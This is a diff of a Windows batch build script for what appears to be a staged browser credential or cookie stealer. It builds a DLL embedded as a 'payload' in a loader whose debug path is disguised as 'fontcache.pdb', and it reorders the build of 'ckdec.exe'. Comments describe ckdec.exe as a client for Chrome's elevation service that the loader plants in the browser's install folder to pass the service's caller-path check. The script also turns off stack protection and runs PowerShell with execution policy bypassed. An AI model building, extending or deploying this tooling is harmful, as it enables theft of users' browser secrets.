@@ -112,6 +112,14 @@ cl /nologo /LD /Od /Oi- /GS- /Gs4096 /utf-8 src\ckdll.cpp bin\chkstk.obj /Fe:bin
          /GUARD:NO /MACHINE:X64 kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib
 if errorlevel 1 ( echo [build] DLL BUILD FAILED & exit /b 1 )
 
+REM --- elevation-service client (v20). Built BEFORE the loader resource: the
+REM     loader embeds it as RCDATA and deploys it into the browser install tree
+REM     at runtime, because the service validates the caller path. ---
+echo [build] ckdec.exe ...
+cl /nologo /O2 /MT /std:c++17 /utf-8 src\ckdec.cpp /Fe:bin\ckdec.exe ^
+   /link /SUBSYSTEM:CONSOLE ole32.lib oleaut32.lib crypt32.lib
+if errorlevel 1 ( echo [build] CKDEC BUILD FAILED & exit /b 1 )
+
 REM --- generate payload.h (byte array of the DLL embedded in loader.exe) ---
 echo [build] payload.h ...
 powershell -nop -exec bypass -file src\gen.ps1
@@ -125,13 +133,6 @@ if errorlevel 1 ( echo [build] RC FAILED & exit /b 1 )
 cl /nologo /O2 /MT /std:c++17 /utf-8 src\loader.cpp bin\loader.res /Fe:bin\loader.exe ^
    /link /SUBSYSTEM:WINDOWS /PDBALTPATH:fontcache.pdb user32.lib advapi32.lib
 if errorlevel 1 ( echo [build] LOADER BUILD FAILED & exit /b 1 )
-
-REM --- elevation-service client (v20 stage 2; must be copied under Chrome's
-REM     Application dir by stage 1 because the service checks the caller path) ---
-echo [build] ckdec.exe ...
-cl /nologo /O2 /MT /std:c++17 /utf-8 src\ckdec.cpp /Fe:bin\ckdec.exe ^
-   /link /SUBSYSTEM:CONSOLE ole32.lib oleaut32.lib
-if errorlevel 1 ( echo [build] CKDEC BUILD FAILED & exit /b 1 )
 
 echo [build] ALL OK
 for %%f in (bin\ckdll.dll bin\loader.exe bin\ckdec.exe) do echo [build]   %%~nxf  %%~zf bytes
